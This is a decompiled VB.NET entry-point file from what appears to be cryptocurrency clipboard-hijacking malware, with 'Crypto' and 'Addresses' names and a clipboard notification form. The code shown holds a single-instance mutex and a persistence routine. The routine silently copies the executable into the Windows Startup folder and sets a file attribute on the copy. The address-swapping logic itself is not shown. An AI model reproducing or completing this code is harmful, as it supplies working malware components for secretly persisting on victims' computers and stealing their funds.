Imports System
Imports System.Diagnostics
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Threading
Imports System.Windows.Forms
Imports Microsoft.VisualBasic.CompilerServices

Namespace Crypto.Crypto
	' Token: 0x0200000A RID: 10
	Public Class Program
		' Token: 0x06000028 RID: 40 RVA: 0x00002930 File Offset: 0x00000B30
		<DebuggerNonUserCode()>
		Public Sub New()
		End Sub

		' Token: 0x06000029 RID: 41 RVA: 0x0000293C File Offset: 0x00000B3C
		<STAThread()>
		<MethodImpl(MethodImplOptions.NoInlining Or MethodImplOptions.NoOptimization)>
		Public Shared Sub Main()
			Dim flag As Boolean = False
			Addresses.mtx = New Mutex(True, Addresses.Mutexx, flag)
			Dim flag2 As Boolean = Not flag
			If flag2 Then
				ProjectData.EndApp()
			End If
			flag2 = (Operators.CompareString(Addresses.startup, "yes", False) = 0)
			If flag2 Then
				Try
					Dim text As String = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\" + Path.GetFileNameWithoutExtension(Application.ExecutablePath) + ".exe"
					flag2 = File.Exists(text)
					If Not flag2 Then
						File.Copy(Application.ExecutablePath, text)
						File.SetAttributes(text, FileAttributes.Temporary)
					End If
				Catch ex As Exception
				End Try
			End If
			Program.Run()
		End Sub

		' Token: 0x0600002A RID: 42 RVA: 0x00002A00 File Offset: 0x00000C00
		Public Shared Sub Run()
			Application.Run(New ClipboardNotification.NotificationForm())
		End Sub
	End Class
End Namespace
